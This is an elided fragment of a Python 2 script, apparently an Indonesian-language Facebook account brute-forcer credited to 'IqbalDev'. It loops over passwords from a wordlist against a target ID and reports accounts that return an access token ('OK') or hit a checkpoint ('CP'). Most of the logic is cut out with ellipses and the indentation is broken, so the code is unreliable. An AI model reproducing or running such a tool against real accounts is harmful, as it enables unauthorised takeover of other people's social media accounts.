...
def banner():
  ...
  /_______  /\___  >\_//  |__/_______  //\033[37;1m
     v.02 \033[36;1m\//    \//  \033[37;1m    By IqbalDev\033[36;1m\//\033[31;1m
...
def brute_fast():
	...
	try:
	    ...
	    print m+" \n Akun anda kena sesi.. "
            print "  Silahkan buat akun fb baru dan login tools ini kembali.."
	    os.system("rm -f login.txt")
		...
		with open("wordlist.txt", "r") as san_dev:

                  for pas in san_dev:
                    pas = pas.replace("\n", "")
                    print " "+h+"["+p+"~√"+h+"]"+p+" Mencoba Password "+a+"==> " +d+ pas
                    ...
                    if "access_token" in dev:
                        ...
                        print a+" ["+p+"OK"+a+"]"+h+" Username / ID  : "+p+ email
			...
			print " "
                        ...
                        print a+" ["+k+"CP"+a+"]"+h+" Username / ID  : "+k+ email
	      ...
	      os.system("rm -f login.txt")
              ...
              print
              print m+"Terjadi Masalah \n Masukkan ID target yang benar.. \n\n"
